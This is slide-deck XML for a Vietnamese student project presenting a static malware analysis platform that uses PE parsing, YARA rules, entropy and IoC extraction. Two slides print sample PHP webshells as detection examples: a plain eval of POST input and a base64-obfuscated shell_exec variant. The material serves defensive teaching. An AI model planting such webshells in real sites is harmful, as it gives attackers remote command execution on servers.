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5E7EB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MALWARE ANALYSIS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3B82F6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Nền tảng phân tích mã độc tĩnh tự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CA3AF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PE Header · YARA · Entropy · IoC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CA3AF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Đồ án môn Phân tích mã độc — Ngô Long — HUIT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B82F6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1. Giới thiệu đề tài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E5E7EB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Bối cảnh: tấn công mạng gia tăng, mã độc là mối đe dọa hàng đầu.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E5E7EB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Mục tiêu: xây dựng công cụ PHÂN TÍCH TĨNH mã độc tự động.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E5E7EB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Đầu vào: tệp tin (PE, PHP, Python, PowerShell, VBScript...).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E5E7EB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Đầu ra: hash, entropy, PE header, YARA, IoC, phân loại họ mã độc.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E5E7EB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Triển khai: web (frontend + backend FastAPI).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B82F6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2. Phân tích mã độc tĩnh vs động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0B981"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• TĨNH: phân tích KHÔNG thực thi mẫu — an toàn, nhanh.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800">
                <a:solidFill>
                  <a:srgbClr val="9CA3AF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>   –    Đọc magic bytes, hash, entropy, PE header, IoC.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B82F6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• ĐỘNG: chạy mẫu trong sandbox quan sát hành vi.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800">
                <a:solidFill>
                  <a:srgbClr val="9CA3AF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>   –    Phát hiện mã tự giải mã khi chạy (mà tĩnh không thấy).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F59E0B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Đồ án này: TĨNH làm lõi + entropy để nhận biết mã packed.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B82F6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3. Cấu trúc PE (Portable Executable)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E5E7EB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• DOS Header ("MZ") + PE Signature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E5E7EB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• File Header: machine, sections, timestamp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E5E7EB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Optional Header: Entry Point, ImageBase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E5E7EB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Section Table: .text, .data, .rsrc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59E0B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Import/Export Table → đoán hành vi</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8" descr="pe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120640" cy="3824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B82F6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4. YARA · Entropy · IoC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EF4444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• YARA: quy tắc nhận diện mã độc (9 rules định nghĩa sẵn).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0B981"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Entropy: đo độ nén/mã hóa (cao &gt; 7 = nghi packed).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F59E0B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• IoC: IP/URL/domain — dấu vết máy chủ C2.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6" descr="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023360"/>
            <a:ext cx="8686800" cy="34162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B82F6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5. Kiến trúc hệ thống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60886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B82F6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6. Stack công nghệ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418320" cy="46615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B82F6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>7. Quy trình phân tích (6 bước)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3696393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B82F6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>8. Các module phân tích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B82F6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• malware_analyzer.py — hash, entropy, PE, IoC, phân loại họ.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EF4444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• yara_engine.py — nạp &amp; biên dịch YARA rules, quét mẫu.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F59E0B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• webshell_detector.py — regex + data-flow + polyglot.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8B5CF6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• cvss_scoring.py — CVSS 3.1 + CWE + MITRE ATT&amp;CK.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0B981"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• api_server.py — FastAPI nhận file upload.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B82F6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>9. Ví dụ 1: Webshell PHP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F4444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&lt;?php
eval($_POST['cmd']);
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900">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Family: Webshell (web backdoor)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900">
                <a:solidFill>
                  <a:srgbClr val="E5E7EB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• YARA: Webshell_PHP_Eval (CWE-94, T1505.003)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900">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Entropy 5.31 — mã nguồn đọc được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900">
                <a:solidFill>
                  <a:srgbClr val="F59E0B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• → Kẻ tấn công gửi lệnh qua $_POST để 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B82F6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>10. Ví dụ 2: Webshell Obfuscated (base64)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F4444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$a = base64_decode('c2hlbGxfZXhlYw==');
@eval($a($_POST['x']));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900">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Family: PHP Obfuscated Webshell (base64/hex)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900">
                <a:solidFill>
                  <a:srgbClr val="F59E0B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Giải mã payload: base64_decode → "shell_exec"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900">
                <a:solidFill>
                  <a:srgbClr val="E5E7EB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Bằng chứng: base64_decode, eval, $_POST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900">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• → Giấu lệnh độc để né quét chữ ký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B82F6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>11. Luồng tấn công (Kill Chain)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ll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257675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B82F6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>12. Kết quả thực nghiệm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E5E7EB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Bộ test 45 mẫu (30 mã độc + 15 lành tính).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0B981"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Phát hiện đúng các họ: webshell, PowerShell, VBScript, Python RAT, PE packed.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E5E7EB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Trích xuất chính xác IoC (IP/URL/domain C2).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E5E7EB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Phân tích PE header + phát hiện packer UPX.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F59E0B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Sơ đồ minh họa + quy trình 6 bước phục vụ giảng dạy.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B82F6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>13. Kết luận &amp; hướng phát triển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0B981"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Hoàn thiện nền tảng phân tích mã độc tĩnh đa định dạng.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E5E7EB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Tích hợp đủ: pefile, yara, entropy, IoC.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F59E0B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Hạn chế: chưa phân tích động, yara khó cài trên host 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3B82F6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• Hướng đi: sandbox động, unpacker, VirusTotal API, ML.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5E7EB"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cảm ơn thầy cô và các bạn đã lắng nghe!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0B981"/>
                </a:solidFill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CA3AF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Câu hỏi &amp; thảo luận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